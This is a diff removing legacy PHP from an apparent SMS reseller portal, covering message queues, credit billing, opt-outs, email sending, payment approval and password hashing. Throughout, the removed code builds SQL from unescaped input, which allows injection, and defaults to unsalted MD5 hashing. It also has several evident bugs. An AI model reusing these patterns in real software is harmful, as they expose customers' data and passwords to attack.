-	$result = mysql_query($sql) or die(mysql_error());
-	$row = mysql_fetch_assoc($result);
-	
-	$error = 0;
-	$now = date("Y-m-d H:i:s");
-	mysql_query("UPDATE `sentmessages` SET 
-	`status` = 'Processing'
-	 WHERE `id` = '$id'");
-		 
-	$customer = $userID = $row['customer'];
-	$sentFrom = $row['sentFrom'];
-
-	//check credit stuffs if its not an admin 
-	if($customer > 0) {
-		//check user's SMS balance
-		$smsBalance = userData('smsBalance',$userID);	
-		//check required SMS units for each recipients
-		$requiredCredit = smsCost($row['recipient'],$row['message'],$customer);
-		if($Unicode > 0) {
-			$requiredCredit = smsUnicodeCost($row['recipient'],$row['message'],$customer);
-		}
-	
-		if(($smsBalance < 0) || ($smsBalance < $requiredCredit)) {
-			//insert message in sent items
-			$messageLenght = strlen($$row['message']);
-			$messageLenght = mceil($messageLenght/160); //do another check here.
-			$now = date("Y-m-d H:i:s");
-			$extraUnit = $requiredCredit - $smsBalance;
-			$status = 'Failed';
-			$error = 'Insufficient Balance';
-			$error = 1;	
-			
-			//update status
-			mysql_query("UPDATE `sentmessages` SET 
-			`status` = '$status',
-			`error` = 'Insufficient Balance'
-			WHERE `id` = '$id'");
-		}
-	}
-	
-	//send massage in batches
-	$batchSize = 1;
-	$currentList = $recipientcount = explode(',',$row['recipient']);
-	$textMessage = $row['message'];	
-	$senderID = $row['senderID'];
-	$toNumber = $row['recipient'];
-	$unicode = $row['is_unicode'];
-	$mms = $row['is_mms'];
-	$media = $row['media'];
-	
-	$partial_sent = 0;
-	$sendingResponse2 = 'Message Sending Interrupted';
-	if($error < 1) {	
-		if(count($recipientcount) > $batchSize){			
-			foreach($currentList as $to) {
-				//insert into messageDetails table
-				$status = 'Processing';
-				$queue_id = $id;
-				$add = mysql_query("INSERT INTO messagedetails (`id`, `message`, `sender`, `recipient`, `status`, `queue_id`,`is_mms`,`is_unicode`) 
-				VALUES (NULL, '$textMessage', '$senderID', '$to', '$status', '$queue_id','$mms','$unicode');");
-				$mesd_id = mysql_insert_id();
-				$mesd_id  =  getInsertedID('messagedetails');
-				$sendingResponse = sendMessage($senderID,$to,$textMessage,$customer,$sentFrom,$unicode,$mms,$media,1); 
-				
-				if(strpos($sendingResponse,'Message Sent Successfully') !== false) {
-					$unitsUsed = smsCost($to,$textMessage,$customer);
-					if($unicode > 0) {
-						$unitsUsed = smsUnicodeCost($to,$textMessage,$customer);
-					}
-					
-					if($customer > 0) {
-						$smsBalance = userData('smsBalance',$customer);
-						$newBalance = $smsBalance - $unitsUsed;
-						mysql_query("UPDATE `customers` SET `smsBalance` = '$newBalance' WHERE `id` = '$customer'");
-					}
-					mysql_query("UPDATE `sentmessages` SET `units` = units + '$unitsUsed' WHERE `id` = '$id'");
-					//mysql_query("UPDATE `messagedetails` SET `status` = 'Sent' WHERE `id` = '$mesd_id'");
-				} else {
-					$partial_sent = 1;	
-					$sendingResponse2 = $sendingResponse;
-					//mysql_query("UPDATE `messagedetails` SET `status` = 'Failed: $sendingResponse' WHERE `id` = '$mesd_id'");
-				}
-			} 
-		} else { 
-			//insert into messageDetails table
-			$status = 'Processing';
-			$queue_id = $id;
-			$to = $toNumber;
-			$add = mysql_query("INSERT INTO messagedetails (`id`, `message`, `sender`, `recipient`, `status`, `queue_id`,`is_mms`,`is_unicode`) 
-			VALUES (NULL, '$textMessage', '$senderID', '$to', '$status', '$queue_id','$mms','$unicode');");
-			$mesd_id = mysql_insert_id();
-			$mesd_id  =  getInsertedID('messagedetails');
-			$sendingResponse = sendMessage($senderID,$recipientList,$textMessage,$customer,$sentFrom,$IP,$unicode,$mms,$media,1); 
-			
-			if(strpos($sendingResponse,'Message Sent Successfully') !== false) {
-				$unitsUsed = smsCost($to,$textMessage,$customer);
-				if($unicode > 0) {
-					$unitsUsed = smsUnicodeCost($to,$textMessage,$customer);
-				}
-				
-				if($customer > 0) {
-					$smsBalance = userData('smsBalance',$customer);
-					$newBalance = $smsBalance - $unitsUsed;
-					mysql_query("UPDATE `customers` SET `smsBalance` = '$newBalance' WHERE `id` = '$customer'");
-				}
-				mysql_query("UPDATE `sentmessages` SET `units` = units + '$unitsUsed' WHERE `id` = '$id'");
-				//mysql_query("UPDATE `messagedetails` SET `status` = 'Sent' WHERE `id` = '$mesd_id'");
-			} else {
-				$partial_sent = 1;	
-				$sendingResponse2 = $sendingResponse;
-				//mysql_query("UPDATE `messagedetails` SET `status` = 'Failed: $sendingResponse' WHERE `id` = '$mesd_id'");
-			}
-		}
-		
-		$status = 'Failed';
-		if($partial_sent > 0) {
-			$status = 'Sent';
-			$error = 'Notice: Some messages were not sent. See Sent Message detail for more';
-		} else {
-			$status = 'Sent';
-			$error = 'Message Sent Successfully';
-		}	
-		//update status
-		mysql_query("UPDATE `sentmessages` SET 
-		`status` = '$status',
-		`error` = '$error'
-		 WHERE `id` = '$id'");
-	}	
-if($partial_sent > 0) {
-	$error = $sendingResponse2;	
-}
-return $error;	
-}
-
-
-function allowedNumbers($recipients) {
-	/*
-$recipientList = explode(",", $recipients);
-$forbiddenCountry = explode(",", getSetting('forbiddenCountry'));
-$requiredCredit = ''; 
-if(getSetting('forbiddenCountry') == '') {
-	return $recipients;
-} else {
-	if(count($recipientList) > 1) {
-		for($i=0; $i < count($recipientList); $i++){			
-	
-			$unitcost= '';
-			for($j=0; $j < count($forbiddenCountry); $j++){
-				$len = strlen($forbiddenCountry[$j]); 
-				if(substr($recipientList[$i],0,$len) == $forbiddenCountry[$j]){
-					$unitcost=$recipientList[$i ]; 
-					break;
-				}
-			} 
-							
-			$requiredCredit2 = $unitcost ;   
-			$requiredCredit = $requiredCredit.$requiredCredit2.',';
-	
-		} //end for si;
-		
-		$invalid = explode(",", $requiredCredit);
-		$diff = array_diff($recipientList,$invalid);
-		return $output = implode(",",$diff);
-	} else {
-		return $recipients;	
-	}
-}  */
-return $recipients;
-}
-
-
-function sendScheduleMessage($id,$senderID,$recipientList,$textMessage,$customer,$IP, $unicode,$mms,$media) {
-	$error = 0;
-	$now = date("Y-m-d H:i:s");
-		mysql_query("UPDATE `scheduledmessages` SET 
-		`status` = 'Sending'
-		 WHERE `id` = '$id'");
-			 
-		$userID = $customer;
-		$sentFrom = 'Portal';
-
-		//check credit stuffs if its not an admin 
-		if($customer > 0) {
-			//check user's SMS balance
-			$smsBalance = userData('smsBalance',$userID);
-			$reseller = userData('reseller',$userID);	
-			//check required SMS units for each recipients
-			$requiredCredit = smsUnicodeCost($recipientList,$textMessage,$customer);
-			if($unicode > 0) {
-			$requiredCredit = smsUnicodeCost($recipientList,$textMessage,$customer);
-			}
-		
-			if(($smsBalance < 0) || ($smsBalance < $requiredCredit)) {
-				//insert message in sent items
-				$messageLenght = strlen($textMessage);
-				$messageLenght = mceil($messageLenght/160); //do another check here.
-				$now = date("Y-m-d H:i:s");
-				$extraUnit = $requiredCredit - $smsBalance;
-				$status = 'Expired';
-				$error2 = 'Insufficient Balance';
-				$error = 1;	
-				//update status
-				mysql_query("UPDATE `scheduledmessages` SET 
-				`status` = '$status',
-				`error` = '$error2'
-				WHERE `id` = '$id'");
-			 
-				$add = mysql_query("INSERT INTO sentmessages (`id`, `message`, `senderID`, `recipient`, `date`, `customer`, `pages`, `status`, `units`, `sentFrom`, `IP`, `error`, `is_unicode`, `is_mms`, `media`, `reseller`) 
-				VALUES (NULL, '$textMessage', '$senderID', '$recipientList', '$now', '$customer', '$messageLenght', 'Failed', '0', '$sentFrom', '$IP', 'Insufficient Balance','$unicode','$mms','$media', '$reseller');");	
-			}
-		}
-		
-		
-	if($error < 1) {	
-		$add = mysql_query("INSERT INTO sentmessages (`id`, `message`, `senderID`, `recipient`, `date`, `customer`, `pages`, `status`, `units`, `sentFrom`, `IP`, `error`, `is_unicode`, `is_mms`, `media`, `reseller`) 
-		VALUES (NULL, '$textMessage', '$senderID', '$recipientList', '$now', '$customer', '$messageLenght', 'Failed', '0', '$sentFrom', '$IP', 'Insufficient Balance','$unicode','$mms','$media', '$reseller');");	
-		$mesd_id  =  getInsertedID('sentmessages');
-		$sendingResponse = sendQueuedMessage($mesd_id) ;
-		
-		$status = 'Expired';
-		if(strpos($sendingResponse,'Message Sent Successfully') !== false) {
-			$status = 'Completed';
-			$error = 'Successfully Sent';
-		} else {
-			$status = 'Completed';
-			$error = 'Sending Interrupted';
-		}	
-		//update status
-		mysql_query("UPDATE `scheduledmessages` SET 
-		`status` = '$status',
-		`error` = '$error'
-		 WHERE `id` = '$id'");
-	}
-}
-
-
-function addMarketingList($list,$name,$phone) {
-	$add = mysql_query("INSERT INTO marketingcontacts (`id`, `name`, `phone`, `marketinglist`) 
-		VALUES (NULL, '$name', '$phone', '$list');");
-	if($add) {
-		return 'Contact Successfully Added';
-	} else {
-		return 'Unable to Add Contact: '.mysql_error();	
-	}
-}
-
-
-function optOut($keyword,$phone) {
-	$query="SELECT * FROM marketinglist WHERE keyword LIKE '$keyword'"; 
-	$result = mysql_query($query) or die(mysql_error());  
-	$row = mysql_fetch_assoc($result); 
-	$id = $row['id'];
-	
-	mysql_query("DELETE FROM marketingcontacts WHERE phone = '$phone' AND marketinglist = '$id'");
-return true;	
-}
-
-
-function sendEmail($from,$sender,$subject,$to,$message) {
-	$smtpfrom = $from;
-	$from = $sender.' <'.$from.'>';
-	$subject = $subject. "\r\n\r\n";
-	$to = $to;
-	//Build HTML Message
-	$body = '<html><body>';
-	$body .= $message;
-	$body .= '</body></html>';
-	
-	if(getSetting('emailClient') == 'smtp') {	 
-			require DOCUMENT_ROOT.'drivers/includes/Mailer/PHPMailerAutoload.php';
-			$mail = new PHPMailer;
-
-			//$mail->SMTPDebug = 3;                               // Enable verbose debug output			
-			$mail->isSMTP();                                      // Set mailer to use SMTP
-			$mail->Host =  getSetting('smtpServer');  			// Specify main and backup SMTP servers
-			$mail->SMTPAuth = true;                               // Enable SMTP authentication
-			$mail->Username = getSetting('smtpUsername');         // SMTP username
-			$mail->Password = getSetting('smtpPassword');          // SMTP password
-			$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
-			$mail->Port = 587;                                    // TCP port to connect to
-			
-			$mail->setFrom($smtpfrom, $sender);
-			//set recipients
-			$emailList = explode(',', $to);
-			if(count($emailList) > 1) {
-				foreach($emailList as $emailAdd) {
-					$mail->addAddress($emailAdd);   
-					$mail->isHTML(true);                                  // Set email format to HTML
-					
-					$mail->Subject = $subject;
-					$mail->Body    = $body;
-					$mail->AltBody = 'This email contain HTML that could not be displayed by your email reader. Please use a HTML email reader instead.';
-					
-					if(!$mail->send()) {
-						$return = 'Error: ' . $mail->ErrorInfo;
-					} else {
-						$return = 'Sent';
-					}				
-				}
-			} else {
-				$mail->addAddress($to); 
-				$mail->isHTML(true);                                  // Set email format to HTML
-				
-				$mail->Subject = $subject;
-				$mail->Body    = $body;
-				$mail->AltBody = 'This email contain HTML that could not be displayed by your email reader. Please use a HTML email reader instead.';
-				
-				if(!$mail->send()) {
-					$return = 'Error: ' . $mail->ErrorInfo;
-				} else {
-					$return = 'Sent';
-				}				
-			}
-			
-	} else {
-		//Send Mail
-		$headers = "From: " . $from . "\r\n";
-		$headers .= 'MIME-Version: 1.0' . "\r\n";
-		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";	
-		//Send the email!
-		mail($to,$subject,$body,$headers);	
-		$return = 'Sent';
-	}
-	return $return;
-}
-
-
-function sendResellerEmail($from,$sender,$subject,$to,$message,$reseller) {
-	$sv = getResellerSetting('smtp_server',$reseller);
-	$un = getResellerSetting('smtp_user',$reseller);
-	$up = getResellerSetting('smtp_password',$reseller);
-	if(empty($sv) || empty($un) || empty($up)) {
-	//Build HTML Message
-	$from = $sender.' <'.$from.'>';
-	$subject = $subject. "\r\n\r\n";
-	$to = $to;
-	$body = '<html><body>';
-	$body .= $message;
-	$body .= '</body></html>';
-	
-		//Send Mail
-		$headers = "From: " . $from . "\r\n";
-		$headers .= 'MIME-Version: 1.0' . "\r\n";
-		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";	
-		//Send the email!
-		mail($to,$subject,$body,$headers);	
-		return 'Sent';
-	} else {
-	
-	$smtpfrom = $from;
-	$from = $sender.' <'.$from.'>';
-	$subject = $subject. "\r\n\r\n";
-	$to = $to;
-	//Build HTML Message
-	$body = '<html><body>';
-	$body .= $message;
-	$body .= '</body></html>';
-	
-			require DOCUMENT_ROOT.'drivers/includes/Mailer/PHPMailerAutoload.php';
-			$mail = new PHPMailer;
-
-			//$mail->SMTPDebug = 3;                               // Enable verbose debug output			
-			$mail->isSMTP();                                      // Set mailer to use SMTP
-			$mail->Host =  getResellerSetting('smtp_server',$reseller);  			// Specify main and backup SMTP servers
-			$mail->SMTPAuth = true;                               // Enable SMTP authentication
-			$mail->Username = getResellerSetting('smtp_user',$reseller);         // SMTP username
-			$mail->Password = getResellerSetting('smtp_password',$reseller);          // SMTP password
-			$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
-			$mail->Port = 587;                                    // TCP port to connect to
-			
-			$mail->setFrom($smtpfrom, $sender);
-			//set recipients
-			$emailList = explode(',', $to);
-			if(count($emailList) > 1) {
-				foreach($emailList as $emailAdd) {
-					$mail->addAddress($emailAdd);   
-					$mail->isHTML(true);                                  // Set email format to HTML
-					
-					$mail->Subject = $subject;
-					$mail->Body    = $body;
-					$mail->AltBody = 'This email contain HTML that could not be displayed by your email reader. Please use a HTML email reader instead.';
-					
-					if(!$mail->send()) {
-						$return = 'Error: ' . $mail->ErrorInfo;
-					} else {
-						$return = 'Sent';
-					}				
-				}
-			} else {
-				$mail->addAddress($to); 
-				$mail->isHTML(true);                                  // Set email format to HTML
-				
-				$mail->Subject = $subject;
-				$mail->Body    = $body;
-				$mail->AltBody = 'This email contain HTML that could not be displayed by your email reader. Please use a HTML email reader instead.';
-				
-				if(!$mail->send()) {
-					$return = 'Error: ' . $mail->ErrorInfo;
-				} else {
-					$return = 'Sent';
-				}				
-			}
-			
-	return $return;
-	}
-}
-
-
-class Currency {
-
-	function Symbul($id) {
-
-		$result = mysql_query("SELECT * FROM customers WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$client_currency = $row['currency'];
-
-
-
-		$result = mysql_query("SELECT * FROM currencies WHERE id = '$client_currency'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$currency_name = $row['name'];
-
-		$currency_symbul = $row['symbul'];
-
-		$name = $currency_symbul;
-
-		
-
-	return $name;
-
-	}
-
-
-
-	function Rate($id) {
-
-		$result = mysql_query("SELECT * FROM customers WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$client_currency = $row['currency'];
-
-
-
-		$result = mysql_query("SELECT * FROM currencies WHERE id = '$client_currency'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$currency_rate = $row['rate'];
-
-		$name = $currency_rate;
-
-
-
-	return $name;
-
-	}
-
-}
-
-class DefaultCurrency {
-
-	function Symbul($id) {
-
-		$result = mysql_query("SELECT * FROM settings WHERE field = 'defaultCurrency'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$client_currency = $row['value'];
-
-
-
-		$result = mysql_query("SELECT * FROM currencies WHERE id = '$client_currency'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$currency_name = $row['name'];
-
-		$currency_symbul = $row['symbul'];
-
-		$name = $currency_symbul;
-
-		
-
-	return $name;
-
-	}
-
-
-
-	function Rate($id) {
-
-		$result = mysql_query("SELECT * FROM settings WHERE field = 'defaultCurrency'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$client_currency = $row['value'];
-
-
-
-		$result = mysql_query("SELECT * FROM currencies WHERE id = '$client_currency'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$currency_rate = $row['rate'];
-
-		$name = $currency_rate;
-
-
-
-	return $name;
-
-	}
-
-}
-
-
-
-function isCustomGateway($id) {
-
-		$result = mysql_query("SELECT * FROM paymentgateways WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$custom = $row['custom'];
-
-	if($custom >0) {
-
-	return true;
-
-	} else {
-
-		return false;
-
-	}
-
-}
-
-
-
-function gatewayData($id, $data) {
-
-$result = mysql_query("SELECT * FROM paymentgateways WHERE id='$id'"); 
-
-$row = mysql_fetch_assoc($result);
-
-return $row[$data];	
-
-}
-
-
-
-function gatewayName($id) {
-
-		$result = mysql_query("SELECT * FROM paymentgateways WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$name = $row['name'];
-
-	if($id < 1) {
-
-		$name	= 'Admin Transfer';
-
-	}		
-
-		return $name;
-
-}
-
-
-
-function gatewayAlias($id) {
-
-		$result = mysql_query("SELECT * FROM paymentgateways WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$name = $row['alias'];
-
-	if($id < 1) {
-
-		$name	= 'System';
-
-	}		
-
-		return $name;
-
-}
-
-
-
-function countContacts($id) {
-
-	$sql = "SELECT * FROM contacts WHERE phonebook = '$id'";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);	
-
-return $num;
-
-}
-
-function countInbox($id=0) {
-	$sql = "SELECT * FROM inbox WHERE `read` = 0 AND customer = '$id'";
-	$result = mysql_query($sql);
-	$num = mysql_num_rows($result);	
-return $num;
-}
-
-function countMarketingContacts($id) {
-
-	$sql = "SELECT * FROM marketingcontacts WHERE marketinglist = '$id'";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);	
-
-return $num;
-
-}
-
-function keywordInUse($id) {
-	$sql = "SELECT * FROM marketinglist WHERE keyword = '$id'";
-	$result = mysql_query($sql);
-	$num = mysql_num_rows($result);	
-	if($num < 1) { return false; }
-	else { return true; }
-}
-
-function checkKeyword($field,$message) {
-$return = false;
-	$sql = "SELECT * FROM marketinglist ORDER BY id DESC";
-	$result = mysql_query($sql);
-	$num = mysql_num_rows($result);	
-	for($i = 0; $i < $num; $i++){
-		$id = mysql_result($result,$i,'id');
-		$keyword = mysql_result($result,$i,'keyword');
-		$field = mysql_result($result,$i,$field);
-		if(strpos($message,$keyword) !== false) {
-			$return = $field;
-		}
-	}
-	
-return $result;	
-}
-
-function isAdminUser($id) {
-
-	$sql = "SELECT * FROM users WHERE customer = '$id'";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);	
-
-	if($num >0) {
-
-		return true;
-
-	} else {
-
-		return false;	
-
-	}
-
-}
-
-function customerType($id) {
-
-	$sql = "SELECT * FROM customers WHERE id = '$id'";
-
-	$result = mysql_query($sql);
-
-	$row = mysql_fetch_assoc($result);
-
-	$type = $row['isReseller'];
-
-	if($type >0) {
-
-		return 'Reseller';
-
-	} else {
-
-		return 'Consumer';	
-
-	}
-
-}
-
-function customerStatus($id) {
-
-	$sql = "SELECT * FROM customers WHERE id = '$id'";
-
-	$result = mysql_query($sql);
-
-	$row = mysql_fetch_assoc($result);
-
-	$type = $row['suspended'];
-
-	if($type >0) {
-
-		return 'Suspended';
-
-	} else {
-
-		return 'Active';	
-
-	}
-
-}
-
-
-
-function countCustomers($type) {
-
-	switch($type) {
-
-		case 'active':
-
-		$sql = "SELECT * FROM customers WHERE suspended = '0'";
-
-		break;
-
-		case 'suspended':
-
-		$sql = "SELECT * FROM customers WHERE suspended = '1'";
-
-		break;
-
-		case 'all':
-
-		$sql = "SELECT * FROM customers";
-
-		break;				
-
-	}
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);	
-
-return $num;
-
-}
-
-function getCountryList($default,$field='name',$filter='') {
-	$filterList = explode(',',$filter);
-				
-	$query="SELECT * FROM countrylist order by code asc";
-    $result = mysql_query($query);
-    $num = mysql_num_rows($result);		
-                
-    for($i = 0; $i < $num; $i++){
-        $code = mysql_result($result,$i,'code');
-        $title = mysql_result($result,$i,'name');
-		if($field == 'name') {
-			$title = preg_replace("/[*0-9+]/","",$title);
-			$value = $title;
-		} else {
-			$value = $code;
-		}
-		if(in_array($code, $filterList)) { 
-			echo '';
-		} else {
-           echo '<option '; 
-		   if($default == $code || $default == $title ) echo 'selected';  
-		   echo 'value="'.$value.'">'.$title.'</option>';
-         }  
-	}
-}
-
-
-
-function usernameExist($name) {
-
-	$sql = "SELECT * FROM customers WHERE username = '$name'";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);	
-
-	if($num >0) {
-
-		return true;
-
-	} else {
-
-		return false;	
-
-	}
-
-}
-
-function emailExist($name) {
-
-	$sql = "SELECT * FROM customers WHERE email = '$name'";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);	
-
-	if($num >0) {
-
-		return true;
-
-	} else {
-
-		return false;	
-
-	}
-
-}
-
-
-
-function transactionOwner($id) {
-
-		$result = mysql_query("SELECT * FROM transactions WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$customer = $row['customer'];	
-
-	return $customer;	
-
-}
-
-
-
-function processTransaction($id,$gateway) {
-
-		$result = mysql_query("SELECT * FROM transactions WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$status = $row['status'];	
-
-		
-
-		if($status == 3) {
-
-				
-
-		} else {
-
-
-
-	//Update transaction record
-
-		mysql_query("UPDATE `transactions` SET 
-
-		`status` =  '3',
-
-		`approvedBy` =  '$gateway'
-
-		WHERE  `id` = '$id';");	
-
-	
-
-		$result = mysql_query("SELECT * FROM transactions WHERE id = '$id'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$customer = $row['customer'];
-
-		$units = $row['units'];
-
-		$cost = $row['cost'];	
-
-
-
-		$result = mysql_query("SELECT * FROM customers WHERE id = '$customer'"); 
-
-		$row = mysql_fetch_assoc($result);
-
-		$smsBalance = $row['smsBalance'];
-
-		$smsBorrowed = $row['smsBorrowed'];
-
-		$smsPurchase = $row['smsPurchase'];	
-
-		$name = $row['name'];
-
-		$username = $row['username'];
-
-		$email = $row['email'];
-
-		$phone = $row['phone'];	
-
-		
-
-	$Currency = new Currency();
-
-	$userRate = $Currency->Rate($customer);
-
-	$userSymbul = $Currency->Symbul($customer);
-
-		
-
-		$amount = $userSymbul.round($cost*$userRate,2);	
-
-		$newBalance = $units+$smsBalance-$smsBorrowed;
-
-		$newPurchase = $smsPurchase+$units;
-
-
-
-		if($smsBorrowed > 0) {
-
-			if($smsBorrowed < $units) {
-
-				$newBorrowed = 0.00;
-
-			} else {
-
-				$newBorrowed = $smsBorrowed-$units;
-
-			}
-
-		} else {
-
-			$newBorrowed = '0.00';	
-
-		}
-
-		
-
-		mysql_query("UPDATE `customers` SET 
-
-		`smsBalance` =  '$newBalance',
-
-		`smsPurchase` =  '$newPurchase',
-
-		`smsBorrowed` =  '$newBorrowed'
-
-		WHERE  `id` = '$customer';");				
-
-
-
-	$orderApproveSME = getSetting('orderApproveSME');
-
-	$orderApproveEmail = getSetting('orderApproveEmail');
-
-	$orderApproveEmailSubject = getSetting('orderApproveEmailSubject');
-
-	$smsSender = getSetting('smsSender');
-
-	$emailSender = getSetting('emailSender');
-
-	$emailFrom = getSetting('companyEmail');
-
-
-
-		if(!empty($orderApproveSMS)) {
-
-			$mail = str_replace('[USERNAME]', $username, $orderApproveSMS);	
-
-			$mail = str_replace('[CUSTOMER NAME]', $name, $orderApproveSMS);
-
-			$mail = str_replace('[AMOUNT]', $amount, $orderApproveSMS);
-
-			$mail = str_replace('[BALANCE]', $newBalance, $orderApproveSMS);
-
-			$mail = str_replace('[UNITS]', $units, $orderApproveSMS);	
-
-			$mail = strtr ($orderApproveSMS, array ('[UNITS]' => $units,'[BALANCE]' => $newBalance,'[AMOUNT]' => $amount,'[CUSTOMER NAME]' => $name,'[USERNAME]' => $username));
-
-			$response1 = sendMessage($smsSender,$phone,$mail,'0','Admin',$IP);		
-
-		}
-
-
-
-		if(!empty($orderApproveEmail)) {
-
-			$mail = str_replace('[USERNAME]', $username, $orderApproveEmail);	
-
-			$mail = str_replace('[CUSTOMER NAME]', $name, $orderApproveEmail);
-
-			$mail = str_replace('[AMOUNT]', $amount, $orderApproveEmail);
-
-			$mail = str_replace('[BALANCE]', $newBalance, $orderApproveEmail);
-
-			$mail = str_replace('[UNITS]', $units, $orderApproveEmail);
-
-			$mail = strtr ($orderApproveEmail, array ('[UNITS]' => $units,'[BALANCE]' => $newBalance,'[AMOUNT]' => $amount,'[CUSTOMER NAME]' => $name,'[USERNAME]' => $username));													
-
-			sendEmail($emailFrom,$emailSender,$orderApproveEmailSubject,$email,$mail);
-
-	$date = date('Y-m-d H:i:s');
-
-	$add = mysql_query("INSERT INTO tickets (`id`, `customer`, `subject`, `message`, `date`, `status`, `adminstatus`) 
-
-			VALUES (NULL, '$customer', '$orderApproveEmailSubject', '$mail', '$date', '0', '1');") or die (mysql_error());			
-
-		}						
-
-	}
-
-}
-
-
-
-function getCryptedPassword($plaintext, $salt = '', $encryption = 'md5-hex', $show_encrypt = false)
-
-	{
-
-		// Get the salt to use.
-
-		$salt = getSalt($encryption, $salt, $plaintext);
-
-
-
-		// Encrypt the password.
-
-		switch ($encryption)
-
-		{
-
-			case 'plain':
-
-				return $plaintext;
-
-
-
-			case 'sha':
-
-				$encrypted = base64_encode(mhash(MHASH_SHA1, $plaintext));
-
-				return ($show_encrypt) ? '{SHA}' . $encrypted : $encrypted;
-
-
-
-			case 'crypt':
-
-			case 'crypt-des':
-
-			case 'crypt-md5':
-
-			case 'crypt-blowfish':
-
-				return ($show_encrypt ? '{crypt}' : '') . crypt($plaintext, $salt);
-
-
-
-			case 'md5-base64':
-
-				$encrypted = base64_encode(mhash(MHASH_MD5, $plaintext));
-
-				return ($show_encrypt) ? '{MD5}' . $encrypted : $encrypted;
-
-
-
-			case 'ssha':
-
-				$encrypted = base64_encode(mhash(MHASH_SHA1, $plaintext . $salt) . $salt);
-
-				return ($show_encrypt) ? '{SSHA}' . $encrypted : $encrypted;
-
-
-
-			case 'smd5':
-
-				$encrypted = base64_encode(mhash(MHASH_MD5, $plaintext . $salt) . $salt);
-
-				return ($show_encrypt) ? '{SMD5}' . $encrypted : $encrypted;
-
-
-
-			case 'aprmd5':
-
-				$length = strlen($plaintext);
-
-				$context = $plaintext . '$apr1$' . $salt;
-
-				$binary = _bin(md5($plaintext . $salt . $plaintext));
-
-
-
-				for ($i = $length; $i > 0; $i -= 16)
-
-				{
-
-					$context .= substr($binary, 0, ($i > 16 ? 16 : $i));
-
-				}
-
-				for ($i = $length; $i > 0; $i >>= 1)
-
-				{
-
-					$context .= ($i & 1) ? chr(0) : $plaintext[0];
-
-				}
-
-
-
-				$binary = _bin(md5($context));
-
-
-
-				for ($i = 0; $i < 1000; $i++)
-
-				{
-
-					$new = ($i & 1) ? $plaintext : substr($binary, 0, 16);
-
-					if ($i % 3)
-
-					{
-
-						$new .= $salt;
-
-					}
-
-					if ($i % 7)
-
-					{
-
-						$new .= $plaintext;
-
-					}
-
-					$new .= ($i & 1) ? substr($binary, 0, 16) : $plaintext;
-
-					$binary = _bin(md5($new));
-
-				}
-
-
-
-				$p = array();
-
-				for ($i = 0; $i < 5; $i++)
-
-				{
-
-					$k = $i + 6;
-
-					$j = $i + 12;
-
-					if ($j == 16)
-
-					{
-
-						$j = 5;
-
-					}
-
-					$p[] = _toAPRMD5((ord($binary[$i]) << 16) | (ord($binary[$k]) << 8) | (ord($binary[$j])), 5);
-
-				}
-
-
-
-				return '$apr1$' . $salt . '$' . implode('', $p) . _toAPRMD5(ord($binary[11]), 3);
-
-
-
-			case 'md5-hex':
-
-			default:
-
-				$encrypted = ($salt) ? md5($plaintext . $salt) : md5($plaintext);
-
-				return ($show_encrypt) ? '{MD5}' . $encrypted : $encrypted;
-
-		}
-
-	}
-
-	
-
-function getSalt($encryption = 'md5-hex', $seed = '', $plaintext = '')
-
-	{
-
-		// Encrypt the password.
-
-		switch ($encryption)
-
-		{
-
-			case 'crypt':
-
-			case 'crypt-des':
-
-				if ($seed)
-
-				{
-
-					return substr(preg_replace('|^{crypt}|i', '', $seed), 0, 2);
-
-				}
-
-				else
-
-				{
-
-					return substr(md5(mt_rand()), 0, 2);
-
-				}
-
-				break;
-
-
-
-			case 'crypt-md5':
-
-				if ($seed)
-
-				{
-
-					return substr(preg_replace('|^{crypt}|i', '', $seed), 0, 12);
-
-				}
-
-				else
-
-				{
-
-					return '$1$' . substr(md5(mt_rand()), 0, 8) . '$';
-
-				}
-
-				break;
-
-
-
-			case 'crypt-blowfish':
-
-				if ($seed)
-
-				{
-
-					return substr(preg_replace('|^{crypt}|i', '', $seed), 0, 16);
-
-				}
-
-				else
-
-				{
-
-					return '$2$' . substr(md5(mt_rand()), 0, 12) . '$';
-
-				}
-
-				break;
-
-
-
-			case 'ssha':
-
-				if ($seed)
-
-				{
-
-					return substr(preg_replace('|^{SSHA}|', '', $seed), -20);
-
-				}
-
-				else
-
-				{
-
-					return mhash_keygen_s2k(MHASH_SHA1, $plaintext, substr(pack('h*', md5(mt_rand())), 0, 8), 4);
-
-				}
-
-				break;
-
-
-
-			case 'smd5':
-
-				if ($seed)
-
-				{
-
-					return substr(preg_replace('|^{SMD5}|', '', $seed), -16);
-
-				}
-
-				else
-
-				{
-
-					return mhash_keygen_s2k(MHASH_MD5, $plaintext, substr(pack('h*', md5(mt_rand())), 0, 8), 4);
-
-				}
-
-				break;
-
-
-
-			case 'aprmd5': /* 64 characters that are valid for APRMD5 passwords. */
-
-				$APRMD5 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-
-
-
-				if ($seed)
-
-				{
-
-					return substr(preg_replace('/^\$apr1\$(.{8}).*/', '\\1', $seed), 0, 8);
-
-				}
-
-				else
-
-				{
-
-					$salt = '';
-
